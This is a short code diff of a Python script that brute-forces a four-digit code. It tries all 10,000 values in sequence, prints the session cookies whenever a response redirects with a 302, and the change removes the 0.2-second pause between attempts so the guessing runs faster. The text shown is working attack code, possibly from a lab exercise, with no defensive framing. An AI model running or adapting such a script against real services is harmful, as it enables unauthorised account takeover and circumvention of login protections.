@@ -122,7 +122,7 @@ data4 = {
     ]
 }
 
-def send_request(identify, delay):
+def send_request(identify, delay=0):
         if delay > 0:
                 time.sleep(delay)
         with requests.Session() as session:
@@ -141,7 +141,7 @@ def send_request(identify, delay):
 
 if __name__ == "__main__":
         for i in range(10000):
-                response = send_request(f"{i:04d}", delay=0.2)
+                response = send_request(f"{i:04d}")
                 print(f"\r[+] testing code : {i:04d} ...", end="", flush=True)
                 if response.status_code == 302:
                         print(f"\n{response.cookies.get_dict()} - code : {i}")
